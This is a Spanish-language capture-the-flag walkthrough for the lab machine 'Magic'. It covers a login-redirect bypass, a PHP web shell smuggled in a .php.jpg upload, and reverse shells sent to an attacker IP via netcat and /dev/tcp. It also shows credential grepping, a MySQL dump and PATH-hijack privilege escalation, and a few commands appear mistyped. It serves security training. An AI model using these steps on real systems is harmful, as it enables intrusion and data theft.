# Magic

IP: 10.10.10.185

## Ping y whichSystem

`ping -c 1 10.10.10.185`

`whichSystem.py 10.10.10.185`

# Scanning

`nmap -p- --open -T5 -v -n 10.10.10.185 -oN allPorts` 

`whatweb http://10.10.10.185`

`nmap -sC -sV -p22,80 10.10.10.185 -oN targetedPorts`

`nmap --script http-enum -p80 10.10.10.185 -oN webScan`


## BurpSite
1. Proxy --> Options --> Dont send items out of scope
2. Target --> Scope --> Add

Abrimos la web en el navegador --> wappalyzer

Buscamos la ruta de donde se guardan las imagenes --> intuimos que se pueden subir archivos

- Probamos la pagina login.php --> existe
- Probamos la página upload.php --> nos redirige a login.php
- Probamos la página uploads.php --> no existe
- Probamos hola.php --> nos da página no existe. 

Así que podemos pensar que uploads.php si que existe y nos redirecciona a login.php

- En burpsite --> Proxy --> Options --> intercept server responses
- Intercept on
- Entramos en upload.php
- Vemos la peticion de envio y todo ok
- Vemos la respuesta del servidor y es 302 --> redirect
- Cambiamos el 302 por 200 y forward

- Subimos shell.php --> sólo permite archivos de imágenes
- Subimos coche.jpg --> http://10.10.10.185/images/uploads/coche.jpg
- Subimos coche.jpg y en burpsite cambiamos la extension por .php.jpg y debajo del raw de la imagen añadimos la shell.php
- Queda subida a images/uploads/coche.php.jpg
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=whoami
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=ifconfig

## Reverse Shell

- Cambiamos a bash --> `nc -nlvp 443`
- `ip address` 
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=nc -e /bin/bash 10.10.14.34 443
- Parece que hay una tarea que borra imagenes, tenemos que volver a subir la iagen
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=nc -e /bin/bash 10.10.14.34 443 --> no funciona, probamos bash
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=bash -i >&/dev/tcp/10.10.14.34/443 0>&1 --> no funciona
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=bash -c "bash -i >&/dev/tcp/10.10.14.34/443 0>&1"
- URL encode online --> bash -c "bash -i >&/dev/tcp/10.10.14.34/443 0>&1" --> bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.34%2F443%200%3E%261%22
- http://10.10.10.185/images/uploads/coche.php.jpg?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.34%2F443%200%3E%261%22

- https://www.urlencoder.org/

## Shell

~~~
whoami
ls
script /dev/null -c bash
cd /home/
ls
find \-name user-txt 2>/dev/null
find \-name user-txt 2>/dev/null | xargs ls -l
uname -a
cd /var/www
find \-name config*
grep -r -i -E "user|pass|auth|key|db|database"
su theseus --> pass 
which mysql
cd /magic
ls 
which mysql | grep bin
cat db.php5
mysqlshow -u theseus -p 
mysqlshow -u theseus -p Magic
mysqlshow -u theseus -p Magic login
mysqldump -u theseus -p Magic login
cat /etc/passwd | grep bash
su theseus
cd 
ls
cat user.txt
cd /root
~~~

## Escalar privilegios

`find \-perm -4000 2>/dev/null`

`find \-perm -4000 2>/dev/null | grep -v -E "snap"`

`strings ./bin/sysinfo -n 10`

~~~
echo $PATH
whoami
cd /tmp
which whoami
touch fdisk
chmod 777 fdisk
nano fdisk
~~~

#!/bin/bash

chmod 475 /bin/bash


`export PATH=.:$PATH`

`wich bash | xargs ls -l`

`/bin/sysinfo`

`wich bash | xargs ls -l`

`bash -p`

`whoami`

`cd /root/`

`head root.txt`
